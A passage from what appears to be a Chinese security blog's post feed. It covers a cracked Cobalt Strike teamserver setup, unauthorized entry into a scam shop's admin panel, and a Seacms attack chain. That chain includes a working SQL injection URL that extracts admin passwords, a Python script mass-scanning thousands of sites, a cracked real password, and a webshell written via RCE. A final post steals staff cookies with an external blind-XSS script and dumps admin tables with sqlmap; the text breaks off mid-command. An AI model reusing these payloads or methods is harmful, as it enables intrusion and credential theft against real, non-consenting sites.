releasenotes.txt<br>│  teamserver  服务端程序<br>│  update<br>│  update.jar   更新程序<br>└─third-party 第三方工具，里面放的vnc dll</p><p>当然，强大的CS也支持用户来扩展其功能<br>※私人定制</p><p>①Cobalt Strike可以使用 AggressorScripts脚本来加强自身，使其更加丰满，能够扩展菜单栏，视图Beacon命令行，提权脚本等</p><p>②Cobalt Strike通信配置文件是 Malleable C2 你可以修改 CS的通讯特征，Beacon payload的一些行为</p><p>③Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范&#x2F;框架，它允许黑客根据需要对框架提供的默认HTTP(S)&#x2F;DNS&#x2F;SMB C2 通信通道进行扩展。</p><p>总的来说 CS的自定义功能很强大，使用起来很灵活后期，会讲到相关的使用。</p><h2 id="0x03-Cobaltstrike-teamserver的启动"><a href="#0x03-Cobaltstrike-teamserver的启动" class="headerlink" title="0x03-Cobaltstrike teamserver的启动"></a>0x03-Cobaltstrike teamserver的启动</h2><p>本人使用的Cobaltstrike是3.13汉化破解版本，各位如果有能力，可以支持一下正版哈,价格我是接受不太了的~此外，各位师傅也要买好VPS<br><img src="https://s2.ax1x.com/2019/07/24/eVcwvR.png" alt="eVcwvR.png"><br>开启Cobaltstrike teamserver和运行GUI界面均需要Java环境，因此老哥们必须先把电脑上的Java装好，这个百度上都写的很详细，我在此就不赘述了。</p><h3 id="1-Windows下启动teamserver"><a href="#1-Windows下启动teamserver" class="headerlink" title="1.Windows下启动teamserver"></a>1.Windows下启动teamserver</h3><p>①下载keytool.exe并将其复制到Cobaltstrike文件夹下<br>下载链接:<a href="http://www.onlinedown.net/soft/614989.htm">http://www.onlinedown.net/soft/614989.htm</a></p><p>②切换到Cobaltstrike目录执行如下命令</p><pre><code>Keytool.exe -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</code></pre><p><a href="https://imgchr.com/i/eV6DAS"><img src="https://s2.ax1x.com/2019/07/24/eV6DAS.png" alt="eV6DAS.png"></a></p><p>③执行命令</p><p>  teamserver.bat 8.8.8.8 123456 </p><p>8.8.8.8为你的服务器外网IP,123456为Coabltstrike的客户端密码</p><p>④双击cobaltstrike.bat，填写服务器外网IP和teamserver密码，即可登入</p><h3 id="2-Linux下启动teamserver和客户端"><a href="#2-Linux下启动teamserver和客户端" class="headerlink" title="2.Linux下启动teamserver和客户端"></a>2.Linux下启动teamserver和客户端</h3><p>①cd切换到Cobaltstrike目录下<br>②执行命令<br>teamserver.bat 8.8.8.8 123456<br>8.8.8.8为你的服务器外网IP,123456为Coabltstrike的客户端密码<br><a href="https://s2.ax1x.com/2019/07/24/eV6c1s.png">https://s2.ax1x.com/2019/07/24/eV6c1s.png</a><br>③执行如下命令即可看到GUI界面</p><pre><code>Javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></pre><h2 id="0x04-Cobaltstrike汉化破解版下载"><a href="#0x04-Cobaltstrike汉化破解版下载" class="headerlink" title="0x04-Cobaltstrike汉化破解版下载"></a>0x04-Cobaltstrike汉化破解版下载</h2><p>网上有很多，本BLOG暂不提供个人版本</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次20撸240的沙雕威胁情报提交</title>
      <link href="/2019/03/17/%E8%AE%B0%E4%B8%80%E6%AC%A120%E6%92%B8240%E7%9A%84%E6%B2%99%E9%9B%95%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8F%90%E4%BA%A4/"/>
      <url>/2019/03/17/%E8%AE%B0%E4%B8%80%E6%AC%A120%E6%92%B8240%E7%9A%84%E6%B2%99%E9%9B%95%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h2><p>这是一篇没有任何技术性的文章，单纯记录一下意想不到的赚小钱经历</p><p>前几个月，我的弟弟突然QQ给我发来了一条消息，说要买个QQ飞车的cdk，我作为一个通情达理的好哥哥，自然不好意思回绝，直接叫他发来了淘宝链接<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442441.png" alt="image-20230419144208406" style="zoom:33%;" /><br>23块钱必中A车，月销量1000多。。看起来还行，本来也没多少钱，没仔细想，直接买了下来<br>商家发货的时候私聊给了我这个。。。<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442539.png" alt="image-20230419144235519" style="zoom:33%;" /><br>他们给出的兑换CDK链接为</p><p><a href="http://39.104.158.110/game.html">http://39.104.158.110/game.html</a></p><p>你这是qq飞车的官网？？？如此粗制滥造的cdk兑换界面<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442589.png" alt="image-20230419144255565"></p><p>很明显是在骗人，一怒之下找商家退款</p><p>并且跟骗子客服进行了长时间交流，谁知竟然驳回了我的退款要求</p><p>信息安全从业者的尊严一下觉醒了。</p><h2 id="0x02-进入发卡后台"><a href="#0x02-进入发卡后台" class="headerlink" title="0x02 进入发卡后台"></a>0x02 进入发卡后台</h2><p>访问<a href="http://39.104.158.110这个主界面/">http://39.104.158.110这个主界面</a><br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444080.png" alt="image-20230419144401051"><br>看下前台JS代码<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444875.png" alt="image-20230419144410855"><br>据此推测，极有可能存在未授权访问。</p><p>直接访问网址:<a href="http://39.104.158.110/user/onindex%EF%BC%8C">http://39.104.158.110/user/onindex，</a><br>成功进入后台<br>让我们看看后台是什么样子的<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444291.png" alt="image-20230419144425269"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444658.png" alt="image-20230419144443629">真的很厉害哦，还可以生成官方的cdk？？？<br>还可以配置输入cdk后的返回模板？？？？</p><p>诈骗性质不言而喻，而淘宝评价中全是好评，我也着实费解了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191445240.png" alt="image-20230419144504218"></p><h2 id="0x03-事后"><a href="#0x03-事后" class="headerlink" title="0x03 事后"></a>0x03 事后</h2><p>随后我把他们后台的截图发给了骗子客服，客服也没回复我，咱也不知道是怂了还是怎么了</p><p>一怒之下，决定提交给ASRC</p><p>当时并没想到这种沙雕威胁情报能拿到奖金，只是想惩戒一下这种**骗子而已。</p><p>没想到ASRC确认了情报，下架了该店铺<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191446634.png" alt="image-20230419144601604"><br>我靠，还有24个安全币<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191446127.png" alt="image-20230419144613099"><br>至此，20撸240圆满成功。</p><p>总有些意想不到的际遇，实在没想到这也能给钱</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seacms最新版本注入实战+后台RCE成功getshell</title>
      <link href="/2019/02/11/Seacms%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98-%E5%90%8E%E5%8F%B0RCE%E6%88%90%E5%8A%9Fgetshell/"/>
      <url>/2019/02/11/Seacms%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98-%E5%90%8E%E5%8F%B0RCE%E6%88%90%E5%8A%9Fgetshell/</url>
      
        <content type="html"><![CDATA[<h2 id="0X01海洋CMS简介"><a href="#0X01海洋CMS简介" class="headerlink" title="0X01海洋CMS简介#"></a>0X01海洋CMS简介<a href="https://www.secquan.org/Discuss/1068831#0X001%E6%B5%B7%E6%B4%8BCMS%E7%AE%80%E4%BB%8B">#</a></h2><p>海洋cms是为解决站长核心需求而设计的视频内容管理系统，一套程序自适应电脑、手机、平板、APP多个终端入口，无任何加密代码、安全有保障，是您最佳的建站工具。——来自seacms官网（简而言之就是专门搭建看片网站的cms）<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191935056.png" alt="image-20230419193549025"></p><h2 id="0X02海洋CMS-V9-1以下版本全版本SQL注入分析"><a href="#0X02海洋CMS-V9-1以下版本全版本SQL注入分析" class="headerlink" title="0X02海洋CMS V9.1以下版本全版本SQL注入分析#"></a>0X02海洋CMS V9.1以下版本全版本SQL注入分析<a href="https://www.secquan.org/Discuss/1068831#0X002%E6%B5%B7%E6%B4%8BCMS-V9.1%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%E5%85%A8%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90">#</a></h2><p>看到了最近tools上最新的seacms sql注入漏洞，不由得下体一硬。<br>干干巴巴的，cnm，必须盘他！</p><p>漏洞产生处code如下</p><pre><code class="php">session_start();require_once(&quot;../../include/common.php&quot;);$id = (isset($gid) &amp;&amp; is_numeric($gid)) ? $gid : 0;$page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1;$type = (isset($type) &amp;&amp; is_numeric($type)) ? $type : 1;$pCount = 0;$jsoncachefile = sea_DATA.&quot;/cache/review/$type/$id.js&quot;;//缓存第一页的评论if($page&lt;2)&#123;        if(file_exists($jsoncachefile))        &#123;                $json=LoadFile($jsoncachefile);                die($json);        &#125;&#125;$h = ReadData($id,$page);$rlist = array();if($page&lt;2)&#123;        createTextFile($h,$jsoncachefile);&#125;die($h);        function ReadData($id,$page)&#123;        global $type,$pCount,$rlist;        $ret = array(&quot;&quot;,&quot;&quot;,$page,0,10,$type,$id);        if($id&gt;0)        &#123;                $ret[0] = Readmlist($id,$page,$ret[4]);                $ret[3] = $pCount;                $x = implode(&#39;,&#39;,$rlist);                if(!empty($x))                &#123;                $ret[1] = Readrlist($x,1,10000);                &#125;        &#125;        $readData = FormatJson($ret);        return $readData;&#125;function Readmlist($id,$page,$size)&#123;        global $dsql,$type,$pCount,$rlist;        $ml=array();        if($id&gt;0)        &#123;                $sqlCount = &quot;SELECT count(*) as dd FROM sea_comment WHERE m_type=$type AND v_id=$id ORDER BY id DESC&quot;;                $rs = $dsql -&gt;GetOne($sqlCount);                $pCount = ceil($rs[&#39;dd&#39;]/$size);                $sql = &quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND v_id=$id ORDER BY id DESC limit &quot;.($page-1)*$size.&quot;,$size &quot;;                $dsql-&gt;setQuery($sql);                $dsql-&gt;Execute(&#39;commentmlist&#39;);                while($row=$dsql-&gt;GetArray(&#39;commentmlist&#39;))                &#123;                        $row[&#39;reply&#39;].=ReadReplyID($id,$row[&#39;reply&#39;],$rlist);                        $ml[]=&quot;&#123;\&quot;cmid\&quot;:&quot;.$row[&#39;id&#39;].&quot;,\&quot;uid\&quot;:&quot;.$row[&#39;uid&#39;].&quot;,\&quot;tmp\&quot;:\&quot;\&quot;,\&quot;nick\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;face\&quot;:\&quot;\&quot;,\&quot;star\&quot;:\&quot;\&quot;,\&quot;anony\&quot;:&quot;.(empty($row[&#39;username&#39;])?1:0).&quot;,\&quot;from\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;time\&quot;:\&quot;&quot;.date(&quot;Y/n/j H:i:s&quot;,$row[&#39;dtime&#39;]).&quot;\&quot;,\&quot;reply\&quot;:\&quot;&quot;.$row[&#39;reply&#39;].&quot;\&quot;,\&quot;content\&quot;:\&quot;&quot;.$row[&#39;msg&#39;].&quot;\&quot;,\&quot;agree\&quot;:&quot;.$row[&#39;agree&#39;].&quot;,\&quot;aginst\&quot;:&quot;.$row[&#39;anti&#39;].&quot;,\&quot;pic\&quot;:\&quot;&quot;.$row[&#39;pic&#39;].&quot;\&quot;,\&quot;vote\&quot;:\&quot;&quot;.$row[&#39;vote&#39;].&quot;\&quot;,\&quot;allow\&quot;:\&quot;&quot;.(empty($row[&#39;anti&#39;])?0:1).&quot;\&quot;,\&quot;check\&quot;:\&quot;&quot;.$row[&#39;ischeck&#39;].&quot;\&quot;&#125;&quot;;                &#125;        &#125;        $readmlist=join($ml,&quot;,&quot;);        return $readmlist;&#125;function Readrlist($ids,$page,$size)&#123;        global $dsql,$type;        $rl=array();        $sql = &quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC&quot;;        $dsql-&gt;setQuery($sql);        $dsql-&gt;Execute(&#39;commentrlist&#39;);        while($row=$dsql-&gt;GetArray(&#39;commentrlist&#39;))        &#123;                $rl[]=&quot;\&quot;&quot;.$row[&#39;id&#39;].&quot;\&quot;:&#123;\&quot;uid\&quot;:&quot;.$row[&#39;uid&#39;].&quot;,\&quot;tmp\&quot;:\&quot;\&quot;,\&quot;nick\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;face\&quot;:\&quot;\&quot;,\&quot;star\&quot;:\&quot;\&quot;,\&quot;anony\&quot;:&quot;.(empty($row[&#39;username&#39;])?1:0).&quot;,\&quot;from\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;time\&quot;:\&quot;&quot;.$row[&#39;dtime&#39;].&quot;\&quot;,\&quot;reply\&quot;:\&quot;&quot;.$row[&#39;reply&#39;].&quot;\&quot;,\&quot;content\&quot;:\&quot;&quot;.$row[&#39;msg&#39;].&quot;\&quot;,\&quot;agree\&quot;:&quot;.$row[&#39;agree&#39;].&quot;,\&quot;aginst\&quot;:&quot;.$row[&#39;anti&#39;].&quot;,\&quot;pic\&quot;:\&quot;&quot;.$row[&#39;pic&#39;].&quot;\&quot;,\&quot;vote\&quot;:\&quot;&quot;.$row[&#39;vote&#39;].&quot;\&quot;,\&quot;allow\&quot;:\&quot;&quot;.(empty($row[&#39;anti&#39;])?0:1).&quot;\&quot;,\&quot;check\&quot;:\&quot;&quot;.$row[&#39;ischeck&#39;].&quot;\&quot;&#125;&quot;;        &#125;        $readrlist=join($rl,&quot;,&quot;);        return $readrlist;&#125;</code></pre><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>$rlist还未被初始化就先进入到了ReadData函数，但实际上 $rlist 可控，最终Readrlist函数造成注入<br>漏洞利用Exploit如下(获取管理员表中第一个用户的密码)</p><pre><code>http://www.seacms.com/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`</code></pre><p>Exploit2(获取管理员表中第一个用户的账号)</p><pre><code>http://www.seacms.net/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(name)from%20sea_admin))),@`%27`</code></pre><h2 id="0X03实战注入利用"><a href="#0X03实战注入利用" class="headerlink" title="0X03实战注入利用#"></a>0X03实战注入利用<a href="https://www.secquan.org/Discuss/1068831#0X003%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8">#</a></h2><p>拿到exp后一不做二不休，直接写了个几行脚本怼了一下百度权重排名前10000的站点:</p><p>code如下</p><pre><code class="python">import requestsprint(&quot; Seacms v9 SQL Injection-Author:J0o1ey&quot;)urls = open(r&quot;url.txt&quot;, &quot;r&quot;)payload = &#39;/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`&#39;for url in urls:    testurl = url.strip() + payload    html = requests.get(testurl).text    if &quot;seacms&quot; in html:        print(&quot;[+]Exploit URL:&quot; + testurl)</code></pre><p>虽然比较简陋，但也够用了<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191939045.png" alt="image-20230419193912935"><br>发现了一个目标</p><pre><code>https://www.***.com/comment/api/index.php?gid=1&amp;page=2&amp;rlist[\]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27](https://www.***.com/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`&#39;`, extractvalue(1, concat_ws(0x20, 0x5c,(select (password)from sea_admin))),@`&#39;)`</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191939067.png" alt="image-20230419193959041"></p><p>获取到admin用户的md5加密后的密码为b93af3cf59d757e27ca5<br>somd5成功解密</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191940836.png" alt="image-20230419194011811"></p><p>密码为Qq7788520</p><h2 id="0x004成功获取后台"><a href="#0x004成功获取后台" class="headerlink" title="0x004成功获取后台#"></a>0x004成功获取后台<a href="https://www.secquan.org/Discuss/1068831#0x004%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96%E5%90%8E%E5%8F%B0">#</a></h2><p>拿着后台路径扫描的程序瞎jb一顿乱扫，结果并没有扫到后台</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191940736.png" alt="image-20230419194057700"><br>光拿到管理员账号密码，但是没有后台，那有个卵用啊。。。</p><p>但是，我眉头一皱，发现事情并不简单<br>前面获取到的密码是Qq7788520，这应该是管理员的什么号吧？</p><p>猜测后台为<a href="https://www.***.com/7788520">https://www.***.com/7788520</a><br>结果Duang的一下~真tmd是后台。。。。进去了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191941534.png" alt="image-20230419194134512"></p><p>用之前注入到的账号密码，成功登录之</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191941882.png" alt="image-20230419194153844"></p><h2 id="0x04从后台RCE到Getshell"><a href="#0x04从后台RCE到Getshell" class="headerlink" title="0x04从后台RCE到Getshell#"></a>0x04从后台RCE到Getshell<a href="https://www.secquan.org/Discuss/1068831#0x004%E4%BB%8E%E5%90%8E%E5%8F%B0RCE%E5%88%B0Getshell">#</a></h2><p>即使进了后台，拿不到shell的话，也是很鸡肋的，于是我便找了一下seacms公开的漏洞</p><p>最后找到了CVE-2018-14421，一个Seacms Backend的RCE</p><p>漏洞分析文章：<a href="https://www.anquanke.com/post/id/152764">https://www.anquanke.com/post/id/152764</a></p><p>按照分析文章给出的思路，注入的PHP代码是一串基于模板语法的代码，过滤时没有过滤$GLOBALS，并且可以拼接绕过</p><p>在后台编辑video的时候，在图片pic处注入代码</p><pre><code>&#123;if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//&#125;&#123;end if&#125;</code></pre><p>利用payload是</p><pre><code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo()</code></pre><p>当然了，不一定偏要像作者那样利用，只要在这个video的照片出现的地方通过get方式传导php代码即可</p><p>我在首页上找到了一个叫做“传说中的七公主”的video，</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191946480.png" alt="image-20230419194650458"></p><p>在后台搜索该影片后<br>我把它的照片链接处改为了</p><pre><code>&#123;if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//&#125;&#123;end if&#125;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191947576.png" alt="image-20230419194700547"></p><p>随后构造参数通过fputs向根目录写入webshell:</p><pre><code>http://www.***.com/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=$&#123;fputs(fopen(%27d.php%27,%27w%27),%27%3C?php%20@eval($_POST[c\])?%3E%27</code></pre><p>成功通过RCE利用PHP的fputs函数在网站根目录下，写入了一个名为d.php的Webshell（密码为c）</p><p>高高兴兴连接之</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191948232.png" alt="image-20230419194814200"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黄叶地</title>
      <link href="/2018/10/27/%E9%BB%84%E5%8F%B6%E5%9C%B0/"/>
      <url>/2018/10/27/%E9%BB%84%E5%8F%B6%E5%9C%B0/</url>
      
        <content type="html"><![CDATA[<p>相同的夜，相同的人，拿着相同的笔，写着自己的随笔。</p><p>这正是北国的秋天。</p><p>袅袅兮秋风，洞庭波兮木叶下。无论是山林间，湖畔旁，或是校园中，每一棵树木都进行着一种特殊的告别。</p><p>无论这世界怎样经历沧海桑田之变，秋雨淅沥沥沥的夜里，总会听到落叶之声。</p><p>这是注定包裹他们的生命仪式。</p><p>待到睡眼惺忪的人从床上醒来，略带睡意地走出房门，雨后汹涌袭来的寒意让他打了个寒颤，清醒了几分。擦亮眼睛，他选择仰观碧云之天，俯察黄叶之地。</p><p>树木一夜之间纵情所欲，选择把所有流动着纯粹的鲜绿汁液的叶子铸成金币，在雨夜中尽情挥撒，沙沙作响，这黄叶纵然落到地下，这也不失为一种掷地有声的馈赠。</p><p>人们似乎对这般大自然的赠礼失去了兴趣，并不无兴趣躬身拾起。</p><p>日出东南隅，照在他的脸上。晓露初歇，独行之人弯下腰拾起了几片黄叶。</p><p>他把叶子放在阳光之下，叶子上的露水折射出了几分动人的光晕。</p><p>他笑了下，或许所谓的一叶知秋便是如此，山河表里，尽在这树叶之中。</p><p>这片树叶拥有了那份风风火火的冷冷清清。</p><p>纯粹且热烈，本真且冷清。</p><p>他选择把树叶夹在了一本精装的黑色书里——王小波的《黄金时代》。</p><p>这是他的黄金时代，也是这片树叶的黄金时代。</p><p>或许等到寒冬到来之时，他无力畅游山林之间。那么他打开这本书，凑近一闻，或许会感受到山林的气息，将不同的树叶拼凑出几组神奇的图案，那就更有意思了。</p><p>他遐想着一切，日落西山。</p><p>黄昏下，浪子停在路旁，对着光秃秃的树干和满地的黄叶发呆。</p><p>树叶离开了枝干，花瓣离开了花朵。山映斜阳天接水，芳草无情。</p><p>黯乡魂，追旅思。永远向着北方，独行的浪子想回到故乡了，但他并不知道故乡在哪。因此他那无尽的旅程是难以言说的漫长。</p><p>原来一切众生，凡是同根，凡属血性，皆有同感。</p><p>也许他俩都像三毛写的那样：</p><blockquote><p>“如果有来生， <br>要做一棵树， <br>站成永恒， <br>没有悲欢的姿势。 <br>一半在土里安详， <br>一半在风里飞扬， <br>一半洒落阴凉， <br>一半沐浴阳光， <br>非常沉默非常骄傲， <br>从不依靠，从不寻找。”</p></blockquote><p>风铃响了，拿着拾起的黄叶，在怀里睡去吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活偶悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次以小勃大，紧张刺激的渗透测试</title>
      <link href="/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>emmm，炎炎夏日到来，这么个桑拿天干什么好呢？</p><p>没错，一定要坐在家里，吹着空调，吃着西瓜，然后静静地挖洞。挖洞完叫个外卖，喝着啤酒，撸着烧烤，岂不美哉？然此可为智者道，难为俗人言也。。。正在我沉迷在对夏日的意淫之时，我亲爱的妈妈忽然给我来了一波夺命连环call。<br><img src="https://s2.loli.net/2023/04/19/AkbOQ8mXJrWGciF.png" alt="image"></p><pre><code>大概内容如下：   --妈妈：儿呀。。。你印布隐私（认不认识）搞公务员培训的机构，帮我在网上瞅瞅去，我有个朋友他儿想考公务员~   --我：（声音笑嘻嘻，心里mmp）哎呀，这个bia的天，搁家里睡觉行了。。别弄了。。   --妈妈：MLGB，叫你整，你就快点的，晚上给我回电话。     哎，父母之命不可违，悲伤的我只能放下手里的键盘和瓜皮，开始去百度上找培训机构。</code></pre><p><img src="https://s2.loli.net/2023/04/19/8SXb7ntzhoQa1VW.png" alt="image"></p><p>百度上面找了好久，都没找到太合适的。问了问身边的朋友：朋友给了一家网校的报名地址<br><a href="http://xxxxx.com/3g/***/2203947.htm">http://xxxxx.com/3g/***/2203947.htm</a><br><img src="https://s2.loli.net/2023/04/19/XGxvwty2PqhbYFm.png" alt="image"></p><p>没错，还带免费试学。。。真的先进。。。。<br>于是打开爱站查了一波权重。。。<br><img src="https://s2.loli.net/2023/04/19/7h8WRjPqx2pzUti.png" alt="image"></p><p>这尼玛？？？百度权7，emmm，有点意思。见到这么高权重的站，那时我已饥渴难耐，便决定对此站点来一波渗透测试。</p><h2 id="二、XSS盲打？安排一下"><a href="#二、XSS盲打？安排一下" class="headerlink" title="二、XSS盲打？安排一下"></a>二、XSS盲打？安排一下</h2><p><img src="https://s2.loli.net/2023/04/19/TBtgFWdhwo1rHva.png" alt="image"></p><p>看到这里，小伙伴们肯定想。。。emm，是不是可以XSS打一下试试呢？<br>说干咱就干。。。见框就插,接下来就插入xss payload试试吧。。。<br>Payload: <code>&lt;/textarea&gt;&lt;script src=&quot;=&quot;http://xsspt.com/z6ocdy?1531815744&quot;&gt;&lt;/script&gt;</code><br>将payload完整黏贴进去，如图发现仅有&lt;&#x2F;tex    这四个字符<br><img src="https://s2.loli.net/2023/04/19/qlosKBVe4MQ7wnT.png" alt="image"></p><p>审查元素看下，在表单处理上设置了maxlength，直接审查元素大法改掉就好了<br>max length改为999<br><img src="https://s2.loli.net/2023/04/19/INOkbRoaCGU2trM.png" alt="image"><br> 然后我们的XSS Payload就可以正常地全部输入到表单中了<br><img src="https://s2.loli.net/2023/04/19/rEiRl8Oez6Y4Nbf.png" alt="image"></p><p>手机那个文本框，我随便填了11位数字，然后点击提交，万幸的的是提交成功了（后端没对内容进行验证）<br>过了大概1个小时，突然XSS平台的邮件来了，兴奋ing。。。（客服是真的敬业）<br><img src="https://s2.loli.net/2023/04/19/jFwefGsIN4zWPhA.png" alt="image"></p><p>拿着cookie，挂好代理傻啦吧唧地就是进入后台一波浏览，发现权限非常小，基本上只能处理处理客服工作<br><img src="https://s2.loli.net/2023/04/19/CDsozeBltMFfQnK.png" alt="image"></p><p>不过可以查看后台的管理员账号。。。。。（果然是个大站，后台分工权限这么讲究。。。）<br><img src="https://s2.loli.net/2023/04/19/ENcTCxLXKJve3qi.png" alt="image"></p><p>看着这么多的超级管理员账号，而我却只是个吊毛客服，基本上没什么权限，心里真的难受的一批。。<br>难道我们的渗透到这里就要结束？？不可能，这显然不符合本屌的风格。。。<br><img src="https://s2.loli.net/2023/04/19/7caIFXZzemCRuVf.png" alt="image"></p><p>于是我又仔细地翻了翻后台，看看有没有地方可以来一波骚操作。。。</p><h2 id="三、后台SQL注入？讲究"><a href="#三、后台SQL注入？讲究" class="headerlink" title="三、后台SQL注入？讲究"></a>三、后台SQL注入？讲究</h2><p>大家可以看到我们的客服处理界面是可以进行查询的，查询的过程是通过GET方式传导一个mobile参数实现查询</p><p>我们直接FUZZ了一下SQL注入的Payload，看看是否存在注入。</p><p>发现传递特殊字符后，页面没有返回信息，那么就很有可能存在SQL注入。<br><img src="https://s2.loli.net/2023/04/19/5yzX2oJbgBaNnGY.png" alt="image"></p><p>我们使用BurpSuite来抓取本出的的HTTP请求，然后保存在C:\Users\Samsung 700Z5C\Desktop\1.txt中<br><img src="https://s2.loli.net/2023/04/19/7UEgMCSLybF4YIH.png" alt="image"></p><p>接下来到了以小勃大，紧张刺激的时刻，使用SQLMAP的 -r参数，注入本HTTP请求<br><code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt</code><br><img src="https://s2.loli.net/2023/04/19/FQko9HntjrMm5T4.png" alt="image"></p><p>注入成功了。哈哈哈。。。。我们开始直奔管理员的表<br>命令为<code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt --tables -D &quot;nd_net&quot; </code>     &#x2F;&#x2F;列出nd_net数据库的表<br><img src="https://s2.loli.net/2023/04/19/aD5vJPpdItVkgU4.png" alt="image"></p><p>然后执行<br><code>sqlmap -r C:\Users\Samsung\Desktop\1.txt --columns -T &quot;net_admin_user&quot; -D &quot;nd_net&quot;   //列出net_admin_user</code>表的字段<br><img src="https://s2.loli.net/2023/04/19/syGtfThrBKvXSep.png" alt="image"></p><p>最后执行命令<br><code>sqlmap.py -r &quot;I:\T00l\1.txt&quot; --dump -C &quot;id,nd_user,userid,nd_pass&quot; -T 